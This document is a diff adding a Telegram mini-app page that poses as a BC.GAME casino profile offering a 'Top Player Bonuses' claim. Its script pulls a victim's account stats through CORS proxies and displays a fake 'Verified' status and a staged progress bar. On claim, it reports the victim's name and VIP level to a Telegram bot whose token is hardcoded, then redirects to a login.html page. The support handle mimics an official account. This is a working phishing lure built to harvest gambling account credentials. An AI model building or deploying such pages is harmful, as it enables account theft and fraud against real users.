+                                    <path d="M17.7359 5.33398C18.6405 5.33398 19.545 5.67702 20.2353 6.35968L27.4689 13.5242C28.8496 14.892 28.8496 17.1081 27.4689 18.476L20.2353 25.6413C19.545 26.3248 18.6405 26.667 17.7359 26.667C17.1506 26.667 16.566 26.5236 16.0387 26.2378L7.02847 26.2369C5.07607 26.2369 3.49316 24.6694 3.49316 22.7357V12.6017C3.49316 10.6689 5.07607 9.10054 7.02847 9.10054L12.4692 9.09969L15.2366 6.35968C15.8808 5.72225 16.7111 5.38092 17.555 5.33825L17.7359 5.33398ZM17.7359 7.47155C17.3682 7.47155 17.0226 7.6132 16.7623 7.87091L9.5287 15.0362C8.99196 15.5679 8.99196 16.4331 9.5287 16.9647L16.7623 24.1301C17.0226 24.3869 17.3682 24.5294 17.7359 24.5294C18.1037 24.5294 18.4493 24.3869 18.7087 24.1301L25.9423 16.9647C26.4791 16.4331 26.4791 15.5687 25.9423 15.0362L18.7087 7.87091C18.4485 7.6132 18.1029 7.47155 17.7351 7.47155H17.7359ZM17.7359 17.6687C18.6865 17.6687 19.4571 18.4325 19.4571 19.3745C19.4571 20.3166 18.6865 21.0795 17.7359 21.0795C16.7845 21.0795 16.0139 20.3157 16.0139 19.3745C16.0139 18.4333 16.7845 17.6687 17.7359 17.6687ZM17.7359 11.0862C18.6865 11.0862 19.4571 11.8499 19.4571 12.7912C19.4571 13.7324 18.6865 14.4969 17.7359 14.4969C16.7845 14.4969 16.0139 13.7332 16.0139 12.7912C16.0139 11.8491 16.7845 11.0862 17.7359 11.0862Z"></path>
+                                </svg>
+                                <span>Total Wins</span>
+                            </div>
+                            <p id="wins" class="stat-value">0</p>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-label-row">
+                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M11.1788 23.4668C12.5674 24.366 14.2226 24.8872 15.9995 24.8872C17.4173 24.8872 18.7571 24.5554 19.946 23.9649L20.198 23.8346L21.9706 26.2758L22.0417 26.3641C22.0426 26.3649 22.0435 26.3658 22.0443 26.3675C20.2691 27.4055 18.2033 28.0004 15.9987 28.0004C13.65 28.0004 11.4591 27.325 9.60933 26.1584L9.34704 25.9886L11.1771 23.466L11.1788 23.4668ZM27.5739 12.8079C27.8516 13.822 27.9999 14.8891 27.9999 15.9915C27.9999 19.6241 26.3884 22.8805 23.8418 25.0826L23.8075 25.0252L23.7689 24.9695L22.01 22.5462C23.7792 20.9202 24.8884 18.5861 24.8884 15.9923C24.8884 15.3357 24.8173 14.6954 24.6827 14.0791L24.6098 13.7731L27.5739 12.8088V12.8079ZM4.35573 13.0745L7.11411 13.9711L7.22382 14.0002C7.25897 14.008 7.29411 14.014 7.32926 14.0174C7.18525 14.6517 7.10982 15.3126 7.10982 15.9906C7.10982 18.2252 7.93271 20.267 9.29218 21.8296L9.47218 22.0311L7.61727 24.5863C5.38434 22.4057 3.99829 19.3601 3.99829 15.9915C3.99829 14.9851 4.12172 14.008 4.35487 13.0745H4.35573ZM15.9995 8.50064C20.1414 8.50064 23.4998 11.859 23.4998 16.0009C23.4998 20.1427 20.1414 23.5011 15.9995 23.5011C11.8577 23.5011 8.49929 20.1427 8.49929 16.0009C8.49929 11.859 11.8577 8.50064 15.9995 8.50064Z"></path>
+                                </svg>
+                                <span>Total Bet Counts</span>
+                            </div>
+                            <p id="bets" class="stat-value">0</p>
+                        </div>
+                        <div class="stat-box full">
+                            <div class="stat-label-row">
+                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M17.0039 6.80469V7.76953L17.0381 7.77051C18.2768 7.81972 19.483 7.99321 20.5215 8.25391H20.6621L20.5488 8.35254L19.5146 9.23926H19.4834C18.3318 8.96609 17.1355 8.80356 15.8838 8.76758C14.7719 8.76758 14.4766 8.96507 14.4766 9.06348C14.4772 9.34476 15.6808 9.48551 16.7363 9.60547C18.5661 9.81693 20.6266 10.0561 20.627 11.083C20.627 12.2018 17.9183 12.441 16.9756 12.4902V13.4824H14.8652V12.4902L14.8252 12.4883C13.4303 12.414 12.0824 12.1626 10.918 11.7871L10.7842 11.7441L11.9814 10.7666H12.0088C13.291 11.1944 14.6573 11.4393 16.0908 11.4697C17.3913 11.4697 17.7366 11.2452 17.7373 11.1113C17.7373 10.8221 16.513 10.6806 15.4365 10.5684C13.6283 10.3923 11.5738 10.1683 11.5732 9.16211C11.5732 8.41625 12.8125 7.9025 14.8809 7.75488V6.80469H17.0039Z"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M15.999 4.83594C21.5299 4.83594 27.9619 6.278 27.9619 10.3525V13.8701C27.9619 14.7398 27.6662 15.4885 27.1504 16.1299C27.6667 16.5802 27.9618 17.22 27.9619 18.1211V21.6396C27.9615 25.7139 21.5159 27.1631 15.999 27.1631C10.4823 27.163 4.03752 25.7138 4.03711 21.6396V18.1211C4.03711 17.2363 4.34168 16.6071 4.87402 16.1641C4.34161 15.5154 4.03717 14.7549 4.03711 13.8701V10.3525C4.03711 6.27896 10.4829 4.83601 15.999 4.83594ZM25.5098 17.4727C23.1296 18.8383 19.3897 19.3857 15.999 19.3857C12.6157 19.3857 8.88469 18.8415 6.50391 17.4824C6.41901 17.6105 6.37307 17.7649 6.37305 17.9521C6.37305 19.8029 10.673 21.3085 15.999 21.3086C21.3253 21.3086 25.6328 19.7815 25.6328 17.9307C25.6328 17.7492 25.5896 17.5984 25.5098 17.4727ZM15.999 6.56641C10.5888 6.56649 6.1911 8.19896 6.19043 10.2109C6.19043 12.2231 10.5737 13.8495 15.999 13.8496C21.4246 13.8496 25.8506 12.2232 25.8506 10.2109C25.8499 8.19891 21.4233 6.56641 15.999 6.56641Z"></path>
+                                </svg>
+                                <span>Total Wagered</span>
+                            </div>
+                            <p id="wagered" class="stat-value">$0.00</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bonus Claim Card -->
+                <div class="bonus-card">
+                    <div class="bonus-card-row">
+                        <div class="bonus-card-copy">
+                            <div class="bonus-card-top">
+                                <h2 class="bonus-card-title">Top Player Bonuses</h2>
+                                <p class="bonus-card-subtitle">Play at the top to unlock exclusive rewards.</p>
+                            </div>
+                            <p id="bonus-text-display" class="bonus-text">Your bonus is being prepared...<br>Verifying eligibility...</p>
+                        </div>
+                        <div class="bonus-card-image-wrapper">
+                            <img class="bonus-card-image" alt="Bonus" src="https://bcgame.st/modules/bonus2/assets/top-Bj1Butrk.png">
+                        </div>
+                    </div>
+                    <button id="claim-bonus-btn" class="claim-bonus-btn" onclick="claimBonus()" aria-label="Claim bonus">
+                        CLAIM
+                    </button>
+                    <div id="bonus-progress-container" class="bonus-progress-container" style="display: none;">
+                        <div class="bonus-progress-bar">
+                            <div id="bonus-progress-fill" class="bonus-progress-fill" style="width: 0%;"></div>
+                            <button id="claim-bonus-progress-btn" class="claim-progress-btn" type="button">LOADING</button>
+                        </div>
+                        <div id="bonus-progress-text" class="bonus-progress-text">Processing...</div>
+                    </div>
+                </div>
+
+                <!-- Info Card -->
+                <div class="card info-card">
+                    <div class="info-row">
+                        <span class="info-label">VIP Level</span>
+                        <span id="vip-info" class="info-value">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status</span>
+                        <span class="info-value green">✓ Verified</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Unlock Rate</span>
+                        <span id="unlock-rate" class="info-value">20%</span>
+                    </div>
+                    <div class="info-row support-row">
+                        <button class="support-action-btn" onclick="contact()">
+                            <span class="support-action-label">CONTACT SUPPORT</span>
+                            <span class="support-action-note">If having issues to claim or any questions, contact support.</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Joined Date -->
+                <div class="joined-row">
+                    <span>Joined on&nbsp;</span>
+                    <span id="joined-date">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="claim-popup" class="popup-bg">
+        <div class="popup-box">
+            <div class="popup-icon">✅</div>
+            <h3>Claim Request Received</h3>
+            <p>Your claim request is open in this mini app. You can close this message and continue browsing your profile.</p>
+            <div class="popup-btns">
+                <button class="popup-btn primary" type="button" onclick="closeClaimPopup()">OK</button>
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+        // Initialize Telegram WebApp
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.enableClosingConfirmation();
+        
+        const SUPPORT = 'BCGame_AIIen';
+        const MEDAL_BASE = 'https://bcgame.st/modules/account2/assets/';
+        const MEDAL_FALLBACK = 'https://bcgame.nz/substation/bc/account/user/achieve/achieve_';
+
+        const MEDAL_MAP = {
+            1: 'achieve_1-B9xW5Dl0.png',
+            2: 'achieve_2-DxVeWeD4.png',
+            3: 'achieve_3-HbTkq4DB.png',
+            5: 'achieve_5-U40GHUWe.png',
+            6: 'achieve_6-Jthl6FTT.png',
+            7: 'achieve_7-D30v3x4F.png',
+            8: 'achieve_8-DceCYIni.png',
+            10: 'achieve_10-FVj4-fe-.png',
+            11: 'achieve_11-BA66adBp.png',
+            12: 'achieve_12-C9KFQwjf.png',
+            13: 'achieve_13-D5DRXCJ8.png',
+            14: 'achieve_14-DwKnvcMV.png',
+            15: 'achieve_15-CcCATeRR.png',
+            16: 'achieve_16-BajZcC6Y.png',
+            '17_ETH': 'achieve_17_ETH-H5RBdgMa.png',
+            '17_BTC': 'achieve_17_BTC-DNje6vXo.png',
+            '17_DOGE': 'achieve_17_DOGE-Dh5GA6bt.png',
+            '17_EOS': 'achieve_17_EOS-DuzeJsTD.png',
+            18: 'achieve_18-CkAhK4x7.png',
+            19: 'achieve_19-CDl8_Rdh.png',
+            20: 'achieve_20-NlwLgBkc.png',
+            21: 'achieve_21-CmVVe6Oc.png'
+        };
+
+        // All medal types from BC.GAME in exact order
+        const ALL_MEDALS = [12, 14, 15, 1, 2, 3, 4, 5, 6, 7, 8, 21, 10, 11, 13, 16, '17_ETH', '17_BTC', '17_DOGE', '17_EOS', 18, 19, 20];
+
+        // CORS Proxies
+        const PROXIES = [
+            url => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
+            url => `https://corsproxy.io/?${encodeURIComponent(url)}`,
+            url => `https://api.codetabs.com/v1/proxy?quest=${url}`
+        ];
+
+        function getUID() {
+            return new URLSearchParams(window.location.search).get('uid');
+        }
+
+        function fmt(n) {
+            if (!n || isNaN(n)) return '0';
+            return parseInt(n).toLocaleString('en-US');
+        }
+
+        function fmtMoney(n) {
+            if (!n || isNaN(n)) return '$0.00';
+            const num = parseFloat(n);
+            if (num >= 1000000) {
+                return '$' + (num / 1000000).toFixed(2) + 'M';
+            } else if (num >= 1000) {
+                return '$' + (num / 1000).toFixed(2) + 'K';
+            }
+            return '$' + num.toFixed(2);
+        }
+
+        // Get unlock rate based on VIP level
+        function getUnlockRate(levelName) {
+            const lvl = levelName || '';
+            let level = 0;
+            let isSVIP = false;
+            
+            if (lvl.toUpperCase().includes('SVIP')) {
+                isSVIP = true;
+                level = parseInt(lvl.replace(/[^0-9]/g, '')) || 0;
+            } else {
+                level = parseInt(lvl.replace(/[^0-9]/g, '')) || 0;
+            }
+            
+            if (isSVIP) {
+                if (level >= 16) return 24;
+                return 23;
+            } else {
+                if (level >= 38) return 22;
+                if (level >= 8) return 21;
+                return 20;
+            }
+        }
+
+        const VIP_STYLE_MAP = {
+            'BRONZE I': {
+                color: 'rgb(221, 181, 170)',
+                backgroundImage: 'linear-gradient(to top, rgba(221, 181, 170, 0.1), transparent)',
+                borderColor: 'rgba(221, 181, 170, 0.6)'
+            },
+            'BRONZE II': {
+                color: 'rgb(221, 181, 170)',
+                backgroundImage: 'linear-gradient(to top, rgba(221, 181, 170, 0.1), transparent)',
+                borderColor: 'rgba(221, 181, 170, 0.6)'
+            },
+            'BRONZE III': {
+                color: 'rgb(221, 181, 170)',
+                backgroundImage: 'linear-gradient(to top, rgba(221, 181, 170, 0.1), transparent)',
+                borderColor: 'rgba(221, 181, 170, 0.6)'
+            },
+            'SILVER I': {
+                color: 'rgb(171, 201, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 201, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 201, 222, 0.6)'
+            },
+            'SILVER II': {
+                color: 'rgb(171, 201, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 201, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 201, 222, 0.6)'
+            },
+            'SILVER III': {
+                color: 'rgb(171, 201, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 201, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 201, 222, 0.6)'
+            },
+            'GOLD I': {
+                color: 'rgb(222, 179, 126)',
+                backgroundImage: 'linear-gradient(to top, rgba(222, 179, 126, 0.1), transparent)',
+                borderColor: 'rgba(222, 179, 126, 0.6)'
+            },
+            'GOLD II': {
+                color: 'rgb(222, 179, 126)',
+                backgroundImage: 'linear-gradient(to top, rgba(222, 179, 126, 0.1), transparent)',
+                borderColor: 'rgba(222, 179, 126, 0.6)'
+            },
+            'PLATINUM I': {
+                color: 'rgb(171, 222, 181)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 222, 181, 0.1), transparent)',
+                borderColor: 'rgba(171, 222, 181, 0.6)'
+            },
+            'PLATINUM II': {
+                color: 'rgb(171, 222, 181)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 222, 181, 0.1), transparent)',
+                borderColor: 'rgba(171, 222, 181, 0.6)'
+            },
+            'PLATINUM III': {
+                color: 'rgb(171, 222, 181)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 222, 181, 0.1), transparent)',
+                borderColor: 'rgba(171, 222, 181, 0.6)'
+            },
+            'PLATINUM IV': {
+                color: 'rgb(171, 222, 181)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 222, 181, 0.1), transparent)',
+                borderColor: 'rgba(171, 222, 181, 0.6)'
+            },
+            'DIAMOND I': {
+                color: 'rgb(171, 178, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 178, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 178, 222, 0.6)'
+            },
+            'DIAMOND II': {
+                color: 'rgb(171, 178, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 178, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 178, 222, 0.6)'
+            },
+            'DIAMOND III': {
+                color: 'rgb(171, 178, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 178, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 178, 222, 0.6)'
+            },
+            'DIAMOND IV': {
+                color: 'rgb(171, 178, 222)',
+                backgroundImage: 'linear-gradient(to top, rgba(171, 178, 222, 0.1), transparent)',
+                borderColor: 'rgba(171, 178, 222, 0.6)'
+            }
+        };
+
+        // Get VIP tier class based on raw level name
+        function getVIPTier(levelName) {
+            const lvl = (levelName || '').toUpperCase();
+            if (lvl.includes('SVIP') || lvl.includes('DIAMOND')) return 'diamond';
+            if (lvl.includes('PLATINUM')) return 'platinum';
+            if (lvl.includes('GOLD')) return 'gold';
+            if (lvl.includes('SILVER')) return 'silver';
+            return 'bronze';
+        }
+
+        function applyVIPBadgeStyle(vipBadge, levelName) {
+            const styleKey = (levelName || '').toUpperCase();
+            const vipStyle = VIP_STYLE_MAP[styleKey];
+            if (vipStyle) {
+                vipBadge.style.color = vipStyle.color;
+                vipBadge.style.backgroundImage = vipStyle.backgroundImage;
+                vipBadge.style.borderColor = vipStyle.borderColor;
+            } else {
+                vipBadge.style.color = '';
+                vipBadge.style.backgroundImage = '';
+                vipBadge.style.borderColor = '';
+            }
+        }
+
+        function formatUserLabel(username, levelName) {
+            const safeName = (username || 'User').trim();
+            const safeLevel = (levelName || '').trim();
+            return safeLevel ? `${safeName} (${safeLevel})` : safeName;
+        }
+
+        async function fetchAPI(uid) {
+            const url = `https://bcgame.nz/api/game/support/user/info/${uid}/`;
+            
+            for (let i = 0; i < PROXIES.length; i++) {
+                try {
+                    const res = await fetch(PROXIES[i](url), {
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    
+                    if (res.ok) {
+                        const txt = await res.text();
+                        console.log('Raw:', txt);
+                        const json = JSON.parse(txt);
+                        if (json && json.data) return json.data;
+                    }
+                } catch (e) {
+                    console.log(`Proxy ${i+1} failed:`, e.message);
+                }
+            }
+            return null;
+        }
+
+        function renderMedals(achievements) {
+            const container = document.getElementById('medals-row');
+            container.innerHTML = '';
+            
+            // Create a map of earned medals
+            const earnedMap = {};
+            if (achievements && achievements.length > 0) {
+                achievements.forEach(a => {
+                    if (a.status === "1" || a.status === 1) {
+                        earnedMap[a.type] = true;
+                    }
+                });
+            }
+
+            // Render all medals in BC.GAME order
+            ALL_MEDALS.forEach(type => {
+                const mappedFile = MEDAL_MAP[type];
+                if (!mappedFile) {
+                    return; // leave medal 4 out, skip unknown entries
+                }
+
+                const div = document.createElement('div');
+                const isEarned = earnedMap[type] || false;
+                div.className = 'medal-item ' + (isEarned ? 'earned' : 'locked');
+                
+                const img = document.createElement('img');
+                let useFallback = false;
+                img.src = `${MEDAL_BASE}${mappedFile}`;
+
+                img.onerror = function() {
+                    if (!useFallback) {
+                        useFallback = true;
+                        this.src = `${MEDAL_FALLBACK}${type}.png`;
+                        return;
+                    }
+                    this.alt = 'medal';
+                    this.style.opacity = '0.15';
+                    this.style.filter = 'grayscale(100%)';
+                };
+                
+                div.appendChild(img);
+                container.appendChild(div);
+            });
+        }
+
+        function render(d) {
+            console.log('Data:', JSON.stringify(d, null, 2));
+            
+            const uid = getUID();
+            
+            // Basic info
+            const userId = d.userId || uid;
+            const name = d.name || 'User';
+            const vipName = d.levelName || 'VIP 0';
+            const totalLikes = (d.totalLikeNum || 0) + (d.shareLikeNum || 0) + (d.headLikeNum || 0);
+            const medalCount = d.medalCount || 0;
+            const achievements = d.achievements || [];
+
+            // Statistics
+            const wager = parseFloat(d.betAmountUsd) || 0;
+            const wins = parseInt(d.winNum) || 0;
+            const bets = parseInt(d.betNum) || 0;
+
+            // Get unlock rate based on VIP level
+            const unlockRate = getUnlockRate(vipName);
+            const vipTier = getVIPTier(vipName);
+            
+            
+            console.log('Parsed - Wager:', wager, 'Wins:', wins, 'Bets:', bets);
+
+            // Update UI
+            document.getElementById('avatar').src = `https://bcgame.nz/api/avatar/${userId}`;
+            document.getElementById('avatar').onerror = function() {
+                this.src = `https://img2.distributedresourcestorage.com/avatar/${userId}/s`;
+            };
+            
+            document.getElementById('name').textContent = name;
+            document.getElementById('uid').textContent = userId;
+            document.getElementById('likes').textContent = fmt(totalLikes);
+            document.getElementById('medal-count').textContent = medalCount;
+
+            // VIP Badge
+            const vipBadge = document.getElementById('vip-badge');
+            vipBadge.textContent = vipName.toUpperCase();
+            vipBadge.className = 'vip-badge ' + vipTier;
+            applyVIPBadgeStyle(vipBadge, vipName);
+
+            // Stats
+            document.getElementById('wins').textContent = fmt(wins);
+            document.getElementById('bets').textContent = fmt(bets);
+            document.getElementById('wagered').textContent = fmtMoney(wager);
+            document.getElementById('vip-info').textContent = vipName;
+            document.getElementById('unlock-rate').textContent = unlockRate + '%';
+            window.profileUserName = name;
+            window.profileUserLevel = vipName;
+            window.profileUserLabel = formatUserLabel(name, vipName);
+
+            // Joined date
+            if (d.createTime) {
+                const date = new Date(d.createTime);
+                document.getElementById('joined-date').textContent = date.toLocaleDateString('en-US', {
+                    month: '2-digit',
+                    day: '2-digit',
+                    year: 'numeric'
+                });
+            }
+
+            // Render medals
+            renderMedals(achievements);
+
+            // Keep bonus message fixed and show claim button
+            checkBonusStatus();
+
+            // Show content
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+        }
+
+        let claimInProgress = false;
+
+        function checkBonusStatus() {
+            const bonusTextDisplay = document.getElementById('bonus-text-display');
+            const claimButton = document.getElementById('claim-bonus-btn');
+            const progressContainer = document.getElementById('bonus-progress-container');
+            const progressFill = document.getElementById('bonus-progress-fill');
+            bonusTextDisplay.innerHTML = 'Your bonus is being prepared...<br>Verifying eligibility...';
+            claimButton.style.display = 'flex';
+            if (progressContainer) progressContainer.style.display = 'none';
+            if (progressFill) progressFill.style.width = '0%';
+            claimInProgress = false;
+        }
+
+        function animateProgressBar() {
+            const progressFill = document.getElementById('bonus-progress-fill');
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 85) progress = 85; // Stop at 85% to indicate waiting for admin
+                
+                progressFill.style.width = progress + '%';
+                
+                if (progress >= 85) {
+                    clearInterval(interval);
+                }
+            }, 300);
+        }
+
+        function showErr() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').style.display = 'flex';
+        }
+
+        function contact() {
+            tg.openTelegramLink(`https://t.me/${SUPPORT}`);
+        }
+        
+        async function sendClaimToTelegram(userLabel) {
+            const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
+            const TELEGRAM_CHAT_ID = "-5244196921";
+            
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const message = `<b>${userLabel}</b> clicked claim`;
+                
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        async function claimBonus() {
+            if (claimInProgress) return;
+            claimInProgress = true;
+
+            const claimButton = document.getElementById('claim-bonus-btn');
+            const progressContainer = document.getElementById('bonus-progress-container');
+            if (claimButton) claimButton.style.display = 'none';
+            if (progressContainer) progressContainer.style.display = 'block';
+
+            animateProgressBar();
+
+            const userLabel = window.profileUserLabel || 'User(vip0)';
+
+            // Send notification to Telegram
+            await sendClaimToTelegram(userLabel);
+
+            // Short delay so the progress bar is visible before redirect
+            setTimeout(() => {
+                const targetUrl = `login.html?username=${encodeURIComponent(window.profileUserName || 'User')}&level=${encodeURIComponent(window.profileUserLevel || 'VIP 0')}&user=${encodeURIComponent(userLabel)}`;
+                window.location.href = targetUrl;
+            }, 600);
+        }
+
+        function showClaimPopup() {
+            const popup = document.getElementById('claim-popup');
+            if (popup) {
+                popup.classList.add('show');
+            }
+        }
+
+        function closeClaimPopup() {
+            const popup = document.getElementById('claim-popup');
+            if (popup) {
+                popup.classList.remove('show');
+            }
+        }
+
+        async function init() {
+            const uid = getUID();
+            console.log('UID:', uid);
+
+            const claim = new URLSearchParams(window.location.search).get('claim');
+            if (claim === '1' || claim === 'true') {
+                showClaimPopup();
+            }
+
+            if (!uid) {
+                showErr();
+                return;
+            }
+
+            try {
+                const data = await fetchAPI(uid);
+                console.log('Fetched:', data);
+
+                if (data) {
+                    render(data);
+                } else {
+                    showErr();
+                }
+            } catch (e) {
+                console.error('Error:', e);
+                showErr();
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
